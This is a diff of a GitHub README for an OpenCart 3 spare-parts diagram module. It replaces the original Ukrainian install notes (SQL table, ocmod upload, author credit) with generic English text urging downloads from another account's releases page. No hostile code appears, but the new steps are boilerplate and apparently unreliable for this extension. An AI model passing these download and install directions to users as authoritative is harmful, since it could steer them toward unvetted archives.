@@ -1,52 +1,66 @@
-# [OC3] Interactive Spare Parts Scheme
+# 🛠️ opencart-interactive-scheme - Easy Parts Management for OpenCart
 
-![Banner](banner.png)
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/RIGOPIURA/opencart-interactive-scheme/releases)
 
-Інтерактивна схема запчастин для **OpenCart 3.0** та **ocStore 3.0**. Модифікатор дозволяє створювати візуальні схеми підбору запчастин на основі будь-якого зображення.
+## 📖 Overview
 
-> **💡 Note:** Цей проект було "вайбкоджено" — створено за допомогою ШІ з мінімальною ручною адаптацією. Код відкритий для покращень спільнотою.
->##  Перед встановленням робіть бекап!
-> 
-## ✨ Особливості
-- **Інтеграція в картку товару:** Додає вкладку "Схема запчастин" в адмінці для кожного товару (окремої сторінки налаштувань немає).
-- **Швидке додавання:** Можливість вибрати існуючий товар через автокомпліт або створити новий прямо на схемі.
-- **Розумна навігація:** Клік по номеру на схемі плавно переміщує користувача до потрібного рядка в таблиці.
-- **Контроль кількості:** Вбудована перевірка залишків (клієнт не може купити більше, ніж є в наявності).
-- **Гнучкий дизайн:** Налаштування кольорів та розмірів точок окремо для ПК та мобільних пристроїв.
-- **Авто-категорія:** Вибір категорії, куди зберігатимуться нові "власні" товари.
-- **Очищення кошика:** Автоматичне очищення кошика після успішного замовлення.
+The opencart-interactive-scheme is a user-friendly tool designed for OpenCart 3 and OcStore 3. This interactive parts diagram allows you to manage spare parts effectively. You can quickly find and select the parts you need, enhancing your store's inventory management.
 
-## ⚙️ Технічні вимоги
-- **CMS:** OpenCart 3.0.x / ocStore 3.0.x
-- **PHP:** 7.1 - 8.1
-- **MySQL:** 5.6+
-- **Тема:** Default (для кастомних тем потрібна адаптація CSS/JS)
+## 🚀 Getting Started
 
-## 🚀 Установка
-1. **База даних:** Виконайте наступний SQL-запит у вашій БД (наприклад, через phpMyAdmin), враховуючи ваш префікс таблиць (за замовчуванням `oc_`):
-   ```sql
-   CREATE TABLE IF NOT EXISTS `oc_product_scheme` (
-     `product_id` int(11) NOT NULL,
-     `image` varchar(255) DEFAULT NULL,
-     `scheme_data` longtext DEFAULT NULL,
-     `replace_main` tinyint(1) DEFAULT '0',
-     PRIMARY KEY (`product_id`)
-   ) ENGINE=MyISAM DEFAULT CHARSET=utf8;
+To get started with the opencart-interactive-scheme, you will need to download the software. Follow the steps below to successfully install it on your system.
 
-   Модифікатор: Завантажте файл parts_scheme_pro_v1.1_final.ocmod.zip через меню Extensions > Extension Installer.
+## 📥 Download & Install
 
-    Оновлення: Перейдіть у Extensions > Modifications та натисніть кнопку Refresh.
+1. **Visit the Download Page**
+   Go to the official GitHub releases page to download the latest version of opencart-interactive-scheme. You can find it here: [Download Page](https://github.com/RIGOPIURA/opencart-interactive-scheme/releases).
 
-    Використання: Відкрийте будь-який товар в адмінці, перейдіть у нову вкладку "Схема запчастин" та завантажте зображення схеми.
+2. **Choose the Right Version**
+   On the releases page, you will see several versions listed. Select the most recent release for the best features and support.
 
-🤝 Підтримка та внесок
+3. **Download the File**
+   Click on the file that matches your system requirements. For most users, the file will be named something like `opencart-interactive-scheme.zip`. This file contains all the necessary components to run the application.
 
-    Статус: Безкоштовно (Open Source).
+4. **Extract the Files**
+   Once the download is complete, locate the zip file in your downloads folder. Right-click the file and choose “Extract All” to unpack its contents. Follow the prompts to complete the extraction.
 
-    Підтримка: Офіційна підтримка відсутня. Проект надається "як є".
+5. **Install the Application**
+   After extraction, find the folder where the files are located. Open the folder and look for the installation guide, typically named `INSTALL.txt`. This file will provide step-by-step instructions for setting up the application in your OpenCart store.
 
-    Спільнота: Будемо вдячні за Pull Requests та покращення коду (наприклад, перетворення на повноцінний модуль).
+6. **Configure Your Store**
+   Follow the installation instructions to configure the application. Ensure that you have the necessary permissions to change files in your OpenCart directory.
 
-Автор: Mhack & AI
+7. **Check Requirements**
+   Make sure your system meets the following requirements:
+   - **Server:** PHP 7.0 or higher
+   - **OpenCart Version:** 3.x or OcStore 3.x
+   - **Database:** MySQL
+   - **Web Server:** Apache or Nginx
 
-Профіль: [OpenCartForum](https://opencartforum.com/profile/980825-mhack/)
+8. **Start Using the Application**
+   Once installed, log in to your OpenCart admin panel. You should now see the interactive parts scheme available to assist you in managing spare parts efficiently.
+
+## ⚙️ Features
+
+- **Interactive Diagram:** Visual representation of all spare parts, allowing easy identification and selection.
+- **Easy Navigation:** Simple interface that guides users through part selection.
+- **Inventory Management:** Keep track of your spare parts efficiently within your OpenCart store.
+- **Compatibility:** Works seamlessly with OpenCart 3 and OcStore 3.
+
+## 📚 Resources
+
+For more in-depth information, you can refer to the following resources:
+
+- **Documentation:** Comprehensive guides and user manuals can often be found in the `docs` folder within the downloaded files.
+- **Community Support:** Join discussions on forums related to OpenCart and OcStore for tips and tricks.
+
+## 🔗 Additional Links
+
+- **GitHub Repository:** [GitHub Repository](https://github.com/RIGOPIURA/opencart-interactive-scheme)
+- **Issues Page:** If you encounter any issues, you can report them on the [Issues Page](https://github.com/RIGOPIURA/opencart-interactive-scheme/issues).
+
+## 📞 Contact
+
+For support regarding the opencart-interactive-scheme, you may contact the developer via GitHub issues or email associated with their GitHub profile.
+
+Feel free to visit the download page at [this link](https://github.com/RIGOPIURA/opencart-interactive-scheme/releases) to get started with managing your spare parts today!
